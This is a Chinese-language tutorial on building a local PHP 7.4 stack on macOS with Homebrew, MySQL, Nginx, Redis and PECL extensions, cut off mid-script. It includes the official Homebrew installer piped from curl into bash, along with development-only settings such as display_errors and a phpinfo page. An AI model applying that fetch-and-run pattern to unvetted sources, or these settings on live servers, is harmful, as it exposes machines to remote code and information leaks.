                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本教程详细记录了在macOS上配置完整的PHP 7.4开发环境，包括MySQL、Redis、Nginx等组件。</p>
</blockquote>
<h2 data-id="heading-0">目录</h2>
<ul>
<li><a href="#%E7%8E%AF%E5%A2%83%E6%A6%82%E8%A7%88" title="#%E7%8E%AF%E5%A2%83%E6%A6%82%E8%A7%88">环境概览</a></li>
<li><a href="#%E5%89%8D%E7%BD%AE%E5%87%86%E5%A4%87" title="#%E5%89%8D%E7%BD%AE%E5%87%86%E5%A4%87">前置准备</a></li>
<li><a href="#%E9%98%B6%E6%AE%B51%E5%AE%89%E8%A3%85homebrew%E5%92%8C%E5%9F%BA%E7%A1%80%E7%BB%84%E4%BB%B6" title="#%E9%98%B6%E6%AE%B51%E5%AE%89%E8%A3%85homebrew%E5%92%8C%E5%9F%BA%E7%A1%80%E7%BB%84%E4%BB%B6">阶段1：安装Homebrew和基础组件</a></li>
<li><a href="#%E9%98%B6%E6%AE%B52%E5%AE%89%E8%A3%85php-74" title="#%E9%98%B6%E6%AE%B52%E5%AE%89%E8%A3%85php-74">阶段2：安装PHP 7.4</a></li>
<li><a href="#%E9%98%B6%E6%AE%B53%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AEmysql" title="#%E9%98%B6%E6%AE%B53%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AEmysql">阶段3：安装和配置MySQL</a></li>
<li><a href="#%E9%98%B6%E6%AE%B54%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AEnginx" title="#%E9%98%B6%E6%AE%B54%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AEnginx">阶段4：安装和配置Nginx</a></li>
<li><a href="#%E9%98%B6%E6%AE%B55%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AEredis%E6%9C%8D%E5%8A%A1%E5%99%A8" title="#%E9%98%B6%E6%AE%B55%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AEredis%E6%9C%8D%E5%8A%A1%E5%99%A8">阶段5：安装和配置Redis服务器</a></li>
<li><a href="#%E9%98%B6%E6%AE%B56php%E6%89%A9%E5%B1%95%E9%85%8D%E7%BD%AEredis%E7%9B%B8%E5%85%B3" title="#%E9%98%B6%E6%AE%B56php%E6%89%A9%E5%B1%95%E9%85%8D%E7%BD%AEredis%E7%9B%B8%E5%85%B3">阶段6：PHP扩展配置（Redis相关）</a></li>
<li><a href="#%E9%98%B6%E6%AE%B57%E5%9F%9F%E5%90%8D%E9%85%8D%E7%BD%AE" title="#%E9%98%B6%E6%AE%B57%E5%9F%9F%E5%90%8D%E9%85%8D%E7%BD%AE">阶段7：域名配置</a></li>
<li><a href="#%E9%98%B6%E6%AE%B58%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%92%8C%E9%AA%8C%E8%AF%81" title="#%E9%98%B6%E6%AE%B58%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%92%8C%E9%AA%8C%E8%AF%81">阶段8：服务管理和验证</a></li>
<li><a href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5" title="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5">常用命令速查</a></li>
<li><a href="#%E6%95%85%E9%9A%9C%E6%8E%92%E9%99%A4" title="#%E6%95%85%E9%9A%9C%E6%8E%92%E9%99%A4">故障排除</a></li>
<li><a href="#%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5" title="#%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5">最佳实践</a></li>
</ul>
<hr/>
<h2 data-id="heading-1">环境概览</h2>
<h3 data-id="heading-2">技术栈版本</h3>






























<table><thead><tr><th>组件</th><th>版本</th><th>说明</th></tr></thead><tbody><tr><td><strong>PHP</strong></td><td>7.4.33</td><td>使用shivammathur/php tap安装</td></tr><tr><td><strong>MySQL</strong></td><td>8.4.x</td><td>Homebrew官方版本</td></tr><tr><td><strong>Redis</strong></td><td>8.4.x</td><td>缓存服务器</td></tr><tr><td><strong>Nginx</strong></td><td>1.29.x</td><td>Web服务器</td></tr></tbody></table>
<h3 data-id="heading-3">目录结构</h3>
<pre><code class="hljs language-perl" lang="perl">~<span class="hljs-regexp">/Sites/</span>                          <span class="hljs-comment"># 项目根目录</span>
├── localhost/                    <span class="hljs-comment"># 主开发环境</span>
│   ├── index.php
│   ├── phpinfo.php
│   ├── db_test.php
│   ├── redis_test.php
│   └── final_verification.php
├── projects/                    <span class="hljs-comment"># 多项目目录</span>
│   ├── blog/
│   ├── shop/
│   ├── admin/
│   └── api/
├── logs/                        <span class="hljs-comment"># 日志目录</span>
│   ├── php/
│   └── nginx/
└── ssl/                         <span class="hljs-comment"># SSL证书目录</span>

/opt/homebrew/                   <span class="hljs-comment"># Homebrew安装目录</span>
├── etc/                         <span class="hljs-comment"># 配置文件</span>
│   ├── php/<span class="hljs-number">7.4</span>/
│   ├── nginx/
│   └── mysql@8.<span class="hljs-number">4</span>/
└── var/                        <span class="hljs-comment"># 数据目录</span>
    ├── mysql@8.<span class="hljs-number">4</span>/
    └── <span class="hljs-keyword">log</span>/
</code></pre>
<hr/>
<h2 data-id="heading-4">前置准备</h2>
<h3 data-id="heading-5">检查系统环境</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 检查Homebrew是否已安装</span>
<span class="hljs-built_in">which</span> brew

<span class="hljs-comment"># 检查Homebrew版本</span>
brew --version

<span class="hljs-comment"># 检查系统架构</span>
<span class="hljs-built_in">uname</span> -m  <span class="hljs-comment"># 应该是arm64（M1/M2/M3）或x86_64（Intel）</span>
</code></pre>
<h3 data-id="heading-6">更新Homebrew</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 更新Homebrew</span>
brew update

<span class="hljs-comment"># 检查是否有待升级的包</span>
brew upgrade
</code></pre>
<hr/>
<h2 data-id="heading-7">阶段1：安装Homebrew和基础组件</h2>
<h3 data-id="heading-8">1.1 安装Homebrew（如未安装）</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装Homebrew（官方命令）</span>
/bin/bash -c <span class="hljs-string">"<span class="hljs-subst">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)</span>"</span>

<span class="hljs-comment"># 添加Homebrew到PATH（Apple Silicon Mac）</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">'eval "$(/opt/homebrew/bin/brew shellenv)"'</span> &gt;&gt; ~/.zprofile
<span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(/opt/homebrew/bin/brew shellenv)</span>"</span>
</code></pre>
<h3 data-id="heading-9">1.2 安装基础依赖</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装常用工具</span>
brew install curl
brew install wget
brew install git
</code></pre>
<hr/>
<h2 data-id="heading-10">阶段2：安装PHP 7.4</h2>
<h3 data-id="heading-11">2.1 添加PHP扩展仓库</h3>
<p>macOS的Homebrew官方仓库不再提供PHP 7.4，需要使用shivammathur/php tap：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 添加PHP版本管理仓库</span>
brew tap shivammathur/php

<span class="hljs-comment"># 更新brew</span>
brew update
</code></pre>
<h3 data-id="heading-12">2.2 安装PHP 7.4</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装PHP 7.4（包含常用扩展）</span>
brew install shivammathur/php/php@7.4

<span class="hljs-comment"># 验证安装</span>
/opt/homebrew/opt/php@7.4/bin/php --version
</code></pre>
<p><strong>输出示例</strong>：</p>
<pre><code class="hljs language-scss" lang="scss">PHP <span class="hljs-number">7.4</span><span class="hljs-selector-class">.33</span> (cli) (built: Dec <span class="hljs-number">19</span> <span class="hljs-number">2025</span> <span class="hljs-number">22</span>:<span class="hljs-number">33</span>:<span class="hljs-number">57</span>) ( NTS )
Copyright (c) The PHP Group
Zend Engine v3<span class="hljs-selector-class">.4</span><span class="hljs-selector-class">.0</span>, Copyright (c) Zend Technologies
    with Zend OPcache v7<span class="hljs-selector-class">.4</span><span class="hljs-selector-class">.33</span>, Copyright (c), by Zend Technologies
</code></pre>
<h3 data-id="heading-13">2.3 配置环境变量</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 编辑shell配置文件</span>
vi ~/.zshrc

<span class="hljs-comment"># 添加以下内容：</span>
<span class="hljs-built_in">export</span> PATH=<span class="hljs-string">"/opt/homebrew/opt/php@7.4/bin:<span class="hljs-variable">$PATH</span>"</span>
<span class="hljs-built_in">export</span> PATH=<span class="hljs-string">"/opt/homebrew/opt/php@7.4/sbin:<span class="hljs-variable">$PATH</span>"</span>

<span class="hljs-comment"># 使配置生效</span>
<span class="hljs-built_in">source</span> ~/.zshrc
</code></pre>
<h3 data-id="heading-14">2.4 验证PHP安装</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 检查PHP版本</span>
php --version

<span class="hljs-comment"># 检查已加载的扩展</span>
php -m

<span class="hljs-comment"># 查看PHP配置信息</span>
php -i
</code></pre>
<hr/>
<h2 data-id="heading-15">阶段3：安装和配置MySQL</h2>
<h3 data-id="heading-16">3.1 安装MySQL 8.4</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装MySQL 8.4</span>
brew install mysql@8.4

<span class="hljs-comment"># 启动MySQL服务</span>
brew services start mysql@8.4

<span class="hljs-comment"># 验证MySQL运行</span>
brew services list | grep mysql
</code></pre>
<h3 data-id="heading-17">3.2 MySQL安全配置</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 运行安全配置脚本</span>
/opt/homebrew/opt/mysql@8.4/bin/mysql_secure_installation

<span class="hljs-comment"># 按照提示完成配置：</span>
<span class="hljs-comment"># 1. 设置VALIDATE PASSWORD component（可选）</span>
<span class="hljs-comment"># 2. 设置root密码</span>
<span class="hljs-comment"># 3. 移除匿名用户</span>
<span class="hljs-comment"># 4. 禁止root远程登录</span>
<span class="hljs-comment"># 5. 移除test数据库</span>
<span class="hljs-comment"># 6. 重新加载权限表</span>
</code></pre>
<h3 data-id="heading-18">3.3 创建开发数据库和用户</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 连接MySQL</span>
mysql -u root -p

<span class="hljs-comment"># 在MySQL命令行中执行：</span>
CREATE DATABASE IF NOT EXISTS dev_database CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;

CREATE USER IF NOT EXISTS <span class="hljs-string">'dev_user'</span>@<span class="hljs-string">'localhost'</span> IDENTIFIED BY <span class="hljs-string">'你的密码'</span>;

GRANT ALL PRIVILEGES ON dev_database.* TO <span class="hljs-string">'dev_user'</span>@<span class="hljs-string">'localhost'</span>;

FLUSH PRIVILEGES;

EXIT;
</code></pre>
<h3 data-id="heading-19">3.4 验证MySQL连接</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用root用户连接</span>
mysql -u root -p -e <span class="hljs-string">"SELECT VERSION();"</span>

<span class="hljs-comment"># 使用开发用户连接</span>
mysql -u dev_user -p -e <span class="hljs-string">"USE dev_database; SHOW TABLES;"</span>
</code></pre>
<h3 data-id="heading-20">3.5 MySQL配置优化（可选）</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 编辑MySQL配置文件</span>
vi /opt/homebrew/etc/mysql/my.cnf

<span class="hljs-comment"># 添加优化配置：</span>
[mysqld]
<span class="hljs-comment"># 字符集配置</span>
character-set-server = utf8mb4
collation-server = utf8mb4_unicode_ci

<span class="hljs-comment"># InnoDB配置</span>
innodb_buffer_pool_size = 256M
innodb_log_file_size = 64M

<span class="hljs-comment"># 连接配置</span>
max_connections = 100
wait_timeout = 28800

<span class="hljs-comment"># 日志配置</span>
slow_query_log = 1
slow_query_log_file = /opt/homebrew/var/log/mysql/slow.log
long_query_time = 2
</code></pre>
<h2 data-id="heading-21">阶段4：安装和配置Nginx</h2>
<h3 data-id="heading-22">4.1 安装Nginx</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装Nginx</span>
brew install nginx

<span class="hljs-comment"># 启动Nginx服务</span>
brew services start nginx

<span class="hljs-comment"># 验证Nginx运行</span>
brew services list | grep nginx

<span class="hljs-comment"># 测试配置语法</span>
nginx -t
</code></pre>
<h3 data-id="heading-23">4.2 配置Nginx虚拟主机</h3>
<h4 data-id="heading-24">4.2.1 创建主开发环境配置</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建主项目目录</span>
<span class="hljs-built_in">mkdir</span> -p ~/Sites/localhost
<span class="hljs-built_in">mkdir</span> -p ~/Sites/logs/{php,nginx}

<span class="hljs-comment"># 设置权限</span>
<span class="hljs-built_in">chmod</span> 755 ~/Sites
</code></pre>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建配置文件</span>
vi /opt/homebrew/etc/nginx/servers/local.dev.conf
</code></pre>
<p><strong>完整配置内容</strong>：</p>
<pre><code class="hljs language-nginx" lang="nginx">server {
    listen 80;
    server_name local.test;
    
    # 网站根目录
    root /Users/你的用户名/Sites/localhost;
    index index.php index.html index.htm;
    
    # 日志配置
    access_log /Users/你的用户名/Sites/logs/nginx/local.test.access.log;
    error_log /Users/你的用户名/Sites/logs/nginx/local.test.error.log;
    
    # PHP处理
    location ~ \.php$ {
        fastcgi_pass 127.0.0.1:9000;
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
        fastcgi_read_timeout 300;
    }
    
    # URL重写（支持Laravel等框架）
    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }
    
    # 隐藏文件保护
    location ~ /\. {
        deny all;
    }
    
    # 静态文件缓存
    location ~* \.(js|css|png|jpg|jpeg|gif|ico|woff|woff2)$ {
        expires 1y;
        add_header Cache-Control "public, immutable";
    }
}
</code></pre>
<h4 data-id="heading-25">4.2.2 创建多项目配置</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建多项目目录</span>
<span class="hljs-built_in">mkdir</span> -p ~/Sites/projects/{blog,shop,admin,api}

<span class="hljs-comment"># 设置权限</span>
<span class="hljs-built_in">chmod</span> 755 ~/Sites

<span class="hljs-comment"># 创建多项目配置</span>
vi /opt/homebrew/etc/nginx/servers/multi_test.conf
</code></pre>
<pre><code class="hljs language-nginx" lang="nginx"># 博客项目
server {
    listen 80;
    server_name blog.test;
    root /Users/你的用户名/Sites/projects/blog;
    index index.php index.html;
    
    access_log /Users/你的用户名/Sites/logs/nginx/blog.test.access.log;
    error_log /Users/你的用户名/Sites/logs/nginx/blog.test.error.log;
    
    location ~ \.php$ {
        fastcgi_pass 127.0.0.1:9000;
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }
}

# 商城项目
server {
    listen 80;
    server_name shop.test;
    root /Users/你的用户名/Sites/projects/shop;
    index index.php index.html;
    
    access_log /Users/你的用户名/Sites/logs/nginx/shop.test.access.log;
    error_log /Users/你的用户名/Sites/logs/nginx/shop.test.error.log;
    
    location ~ \.php$ {
        fastcgi_pass 127.0.0.1:9000;
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }
}

# 管理后台
server {
    listen 80;
    server_name admin.test;
    root /Users/你的用户名/Sites/projects/admin;
    index index.php index.html;
    
    access_log /Users/你的用户名/Sites/logs/nginx/admin.test.access.log;
    error_log /Users/你的用户名/Sites/logs/nginx/admin.test.error.log;
    
    location ~ \.php$ {
        fastcgi_pass 127.0.0.1:9000;
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }
}
</code></pre>
<h3 data-id="heading-26">4.3 重启Nginx</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 测试配置语法</span>
nginx -t

<span class="hljs-comment"># 重启服务</span>
brew services restart nginx

<span class="hljs-comment"># 查看服务状态</span>
brew services list
</code></pre>
<hr/>
<h2 data-id="heading-27">阶段5：安装和配置Redis服务器</h2>
<h3 data-id="heading-28">5.1 安装Redis服务器</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装Redis</span>
brew install redis

<span class="hljs-comment"># 启动Redis服务</span>
brew services start redis

<span class="hljs-comment"># 验证Redis运行</span>
brew services list | grep redis

<span class="hljs-comment"># 测试Redis连接</span>
redis-cli ping
</code></pre>
<h3 data-id="heading-29">5.2 Redis基本配置</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 编辑Redis配置文件</span>
vi /opt/homebrew/etc/redis.conf

<span class="hljs-comment"># 常用配置：</span>
<span class="hljs-built_in">bind</span> 127.0.0.1
port 6379
daemonize no

<span class="hljs-comment"># 内存限制</span>
maxmemory 256mb
maxmemory-policy allkeys-lru

<span class="hljs-comment"># 日志配置</span>
loglevel notice
logfile /opt/homebrew/var/log/redis.log

<span class="hljs-comment"># RDB持久化配置</span>
save 900 1
save 300 10
save 60 10000
</code></pre>
<hr/>
<h2 data-id="heading-30">阶段6：PHP扩展配置（Redis相关）</h2>
<p>本阶段将安装和配置与Redis相关的PHP扩展，包括igbinary序列化加速和LZF压缩扩展。</p>
<h3 data-id="heading-31">6.1 安装前的系统依赖</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 确保Homebrew已更新</span>
brew update

<span class="hljs-comment"># 安装编译工具（如未安装）</span>
brew install autoconf automake libtool
</code></pre>
<h3 data-id="heading-32">6.2 安装igbinary扩展</h3>
<p><strong>igbinary</strong>是一个高性能的二进制序列化扩展，比PHP标准序列化快30-50%，用于提升Redis数据序列化的性能。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装igbinary扩展</span>
/opt/homebrew/opt/php@7.4/bin/pecl install igbinary
</code></pre>
<p><strong>安装说明</strong>：</p>
<ul>
<li>PECL会从pecl.php.net下载最新稳定版本</li>
<li>编译过程会自动完成，无需额外配置</li>
<li>安装完成后扩展会自动添加到php.ini</li>
</ul>
<h3 data-id="heading-33">6.3 安装LZF压缩扩展</h3>
<p><strong>LZF</strong>是一个轻量级的压缩算法，用于Redis数据压缩，可以显著减少内存占用。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装LZF扩展</span>
/opt/homebrew/opt/php@7.4/bin/pecl install lzf
</code></pre>
<p><strong>安装说明</strong>：</p>
<ul>
<li>LZF压缩解压速度极快</li>
<li>适合实时数据压缩场景</li>
<li>与igbinary配合使用效果最佳</li>
</ul>
<h3 data-id="heading-34">6.4 安装Redis扩展（整合版）</h3>
<p><strong>Redis扩展</strong>是PHP连接Redis服务器的客户端库，支持所有Redis命令。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装Redis扩展</span>
/opt/homebrew/opt/php@7.4/bin/pecl install redis
</code></pre>
<p><strong>安装过程中的配置选择</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">enable</span> <span class="hljs-string">igbinary</span> <span class="hljs-string">serializer</span> <span class="hljs-string">support?</span> [<span class="hljs-literal">yes</span>] <span class="hljs-string">:</span> <span class="hljs-literal">yes</span>
<span class="hljs-string">enable</span> <span class="hljs-string">lzf</span> <span class="hljs-string">compression</span> <span class="hljs-string">support?</span> [<span class="hljs-literal">yes</span>] <span class="hljs-string">:</span> <span class="hljs-literal">yes</span>
<span class="hljs-string">enable</span> <span class="hljs-string">zstd</span> <span class="hljs-string">compression</span> <span class="hljs-string">support?</span> [<span class="hljs-literal">no</span>] <span class="hljs-string">:</span> <span class="hljs-literal">no</span>
<span class="hljs-string">enable</span> <span class="hljs-string">msgpack</span> <span class="hljs-string">serializer</span> <span class="hljs-string">support?</span> [<span class="hljs-literal">no</span>] <span class="hljs-string">:</span> <span class="hljs-literal">no</span>
<span class="hljs-string">enable</span> <span class="hljs-string">lz4</span> <span class="hljs-string">compression</span> <span class="hljs-string">support?</span> [<span class="hljs-literal">no</span>] <span class="hljs-string">:</span> <span class="hljs-literal">no</span>
</code></pre>
<p><strong>配置选项说明</strong>：</p>



































<table><thead><tr><th>选项</th><th>推荐</th><th>说明</th></tr></thead><tbody><tr><td><strong>igbinary</strong></td><td>yes</td><td>二进制序列化，比标准序列化快30-50%</td></tr><tr><td><strong>LZF</strong></td><td>yes</td><td>轻量级压缩，CPU开销小，适合缓存数据</td></tr><tr><td><strong>Zstd</strong></td><td>no</td><td>高压缩率算法，但增加复杂度，开发环境不需要</td></tr><tr><td><strong>MessagePack</strong></td><td>no</td><td>跨语言序列化，纯PHP项目不需要</td></tr><tr><td><strong>LZ4</strong></td><td>no</td><td>极速压缩，已有LZF足够</td></tr></tbody></table>
<h3 data-id="heading-35">6.5 验证扩展安装</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 检查扩展是否正确加载</span>
php -m | grep -E <span class="hljs-string">"(redis|igbinary|lzf)"</span>

<span class="hljs-comment"># 应该显示：</span>
<span class="hljs-comment"># igbinary</span>
<span class="hljs-comment"># lzf</span>
<span class="hljs-comment"># redis</span>
</code></pre>
<h3 data-id="heading-36">6.6 PHP.ini基础配置</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 编辑PHP配置文件</span>
vi /opt/homebrew/etc/php/7.4/php.ini

<span class="hljs-comment"># 关键配置：</span>
display_errors = On
error_reporting = E_ALL
log_errors = On
error_log = /Users/你的用户名/Sites/logs/php/php_errors.log

memory_limit = 256M
max_execution_time = 300
upload_max_filesize = 64M
post_max_size = 64M
</code></pre>
<p><strong>扩展配置（通常自动添加，无需手动配置）</strong>：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">extension</span>=igbinary.so
<span class="hljs-attr">extension</span>=lzf.so
<span class="hljs-attr">extension</span>=redis.so
</code></pre>
<h3 data-id="heading-37">6.7 PHP-FPM配置</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 编辑PHP-FPM配置</span>
vi /opt/homebrew/etc/php/7.4/php-fpm.d/www.conf

<span class="hljs-comment"># 配置内容：</span>
[www]
user = 你的用户名
group = staff

listen = 127.0.0.1:9000

pm = dynamic
pm.max_children = 50
pm.start_servers = 5
pm.min_spare_servers = 2
pm.max_spare_servers = 8

php_admin_value[error_log] = /Users/你的用户名/Sites/logs/php/php-fpm.error.log
php_admin_flag[log_errors] = on
</code></pre>
<h3 data-id="heading-38">6.8 重启PHP-FPM服务</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 重启PHP-FPM服务</span>
brew services restart shivammathur/php/php@7.4
</code></pre>
<hr/>
<h2 data-id="heading-39">阶段7：域名配置</h2>
<h3 data-id="heading-40">7.1 为什么使用.test域名</h3>
<p><strong>重要提醒</strong>：不要使用.dev域名！</p>
<p>Chrome浏览器从2021年开始对所有.dev域名实施HSTS（HTTP严格传输安全）策略：</p>
<ul>
<li>❌ .dev域名会强制重定向到HTTPS</li>
<li>❌ 本地开发环境无法提供HTTPS证书</li>
<li>❌ 即使修改hosts文件也无法访问</li>
</ul>
<p><strong>推荐使用.test域名</strong>：</p>
<ul>
<li>✅ 专为本地开发设计</li>
<li>✅ 无HSTS限制</li>
<li>✅ 所有浏览器兼容</li>
<li>✅ RFC规范推荐</li>
</ul>
<h3 data-id="heading-41">7.2 配置hosts文件</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 编辑hosts文件</span>
sudo vi /etc/hosts

<span class="hljs-comment"># 添加以下内容：</span>
127.0.0.1       local.test
127.0.0.1       blog.test
127.0.0.1       shop.test
127.0.0.1       admin.test
127.0.0.1       api.test
</code></pre>
<h3 data-id="heading-42">7.3 验证域名解析</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 测试域名解析</span>
ping local.test
<span class="hljs-comment"># 应该返回：PING local.test (127.0.0.1)</span>

<span class="hljs-comment"># 测试HTTP访问</span>
curl -I http://local.test
<span class="hljs-comment"># 应该返回：HTTP/1.1 200 OK</span>
</code></pre>
<hr/>
<h2 data-id="heading-43">阶段8：服务管理和验证</h2>
<h3 data-id="heading-44">8.1 服务管理命令</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看服务状态</span>
brew services list

<span class="hljs-comment"># 检查端口占用</span>
lsof -i :80,9000,3306,6379
</code></pre>
<h3 data-id="heading-45">8.2 创建测试页面</h3>
<h4 data-id="heading-46">8.2.1 PHP信息页面</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">// ~/Sites/localhost/phpinfo.php</span>
<span class="hljs-title function_ invoke__">phpinfo</span>();
</code></pre>
<h4 data-id="heading-47">8.2.2 数据库连接测试</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">// ~/Sites/localhost/db_test.php</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h1&gt;数据库连接测试&lt;/h1&gt;"</span>;

<span class="hljs-keyword">try</span> {
